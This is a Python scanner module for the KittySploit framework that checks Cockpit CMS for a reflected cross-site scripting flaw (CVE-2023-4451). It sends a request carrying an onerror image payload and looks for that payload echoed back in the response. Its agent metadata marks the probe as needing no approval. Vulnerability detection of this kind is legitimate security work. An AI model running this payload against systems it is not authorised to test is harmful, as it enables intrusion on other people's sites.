#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Cross-site Scripting (XSS) - Reflected in GitHub repository cockpit-hq/cockpit prior to 2."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Cockpit - Cross-Site Scripting Detection',
        'description': 'Cross-site Scripting (XSS) - Reflected in GitHub repository cockpit-hq/cockpit prior to 2.6.4.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2023', 'huntr', 'cockpit', 'xss', 'agentejo', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://huntr.dev/bounties/4e111c3e-6cf3-4b4c-b3c1-a540bf30f8fa/',
            'https://github.com/Cockpit-HQ/Cockpit/commit/30609466c817e39f9de1871559603e93cd4d0d0c',
            'https://nvd.nist.gov/vuln/detail/CVE-2023-4451',
            'https://github.com/cockpit-hq/cockpit/commit/30609466c817e39f9de1871559603e93cd4d0d0c',
            'https://github.com/fkie-cad/nvd-json-data-feeds',
        ],
        'cve': 'CVE-2023-4451',
    }

    def run(self):
        r = self.http_request(method="GET", path='/install/index.php?1692443074&space=%3Cimg%20src=1%20onerror=alert(document.domain)%3E', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_any = ('Space :<img src=1 onerror=alert(document.domain)>: does not exist',)
        header_any = ('text/html',)
        if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='medium',
                reason="Cockpit - Cross-Site Scripting detected",
                path='/install/index.php?1692443074&space=%3Cimg%20src=1%20onerror=alert(document.domain)%3E',
            )
            return True
        return False

